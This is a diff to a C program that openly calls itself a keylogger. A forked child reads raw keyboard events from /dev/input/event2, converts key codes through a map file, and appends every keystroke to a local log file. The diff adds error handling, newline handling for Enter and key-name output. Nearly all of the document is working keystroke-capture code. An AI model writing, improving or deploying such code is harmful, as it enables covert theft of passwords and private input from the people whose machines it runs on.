@@ -3,6 +3,7 @@
 #include <unistd.h>
 #include <fcntl.h>
 #include <linux/input.h>
+#include <string.h>
 
 
 char keys[242][20];
@@ -38,16 +39,20 @@ main() {
 	}
 	else {
 		if(fork() == 0) {
-			close(piped[0]);
-
-			load_key_map();
-
 			int file;
 			FILE *result;
-
+			
+			load_key_map();
+			
 			printf("Iniciando keylogger (%d)\n", getpid());
 
 			file = open("/dev/input/event2", O_RDONLY);
+
+			if (file < 0) {
+				printf("Couldn't open the event file");
+				exit(1);
+			}
+
 			result = fopen("./etc/keys.txt", "a+");
 
 			struct input_event ev;
@@ -56,8 +61,13 @@ main() {
 				read(file, &ev, sizeof(struct input_event));
 				if(ev.type == EV_KEY) {
 					if(ev.value == 1) {
-						//printf(" : [key %i]\n", ev.code);
-						fputc(key[ev.code], result);
+						if(ev.code == 28) {
+							fprintf(result, "\n", "");
+						}
+						else {
+							fprintf(result, "%s", keys[ev.code]);	
+						}
+
 						fflush(result);
 					}
 				}
@@ -66,11 +76,10 @@ main() {
 	}
 }
 
-void load_key_map() {
-	FILE *kf = fopen("./etc/keys.txt", "r");
+load_key_map() {
+	FILE *kf = fopen("./etc/map.txt", "r");
 	if(kf == NULL){ 
-		print_stamp();
-		fprintf(data, "ERROR : keys file missing\n");
+		printf("ERROR : keys file missing\n");
 		exit(0);
 	}
 	char line[40];
